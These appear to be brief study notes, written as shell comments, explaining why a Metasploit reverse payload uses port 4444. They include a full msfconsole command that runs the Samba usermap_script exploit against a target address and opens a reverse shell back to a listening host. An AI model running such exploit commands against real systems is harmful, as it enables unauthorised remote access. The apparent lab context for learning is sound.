# how do you know it will connect to port 4444?

# 1. by running it yourself
# 2. by looking into source code
# 3. by domain knowledge

# the port 4444 is actually used by the payload "cmd/unix/reverse"

# msfconsole -x "use exploit/multi/samba/usermap_script;\
# info;\
# set RHOST 172.16.194.172;\
# set PAYLOAD cmd/unix/reverse;\
# set LHOST 172.16.194.163;\
# run;\
# exit"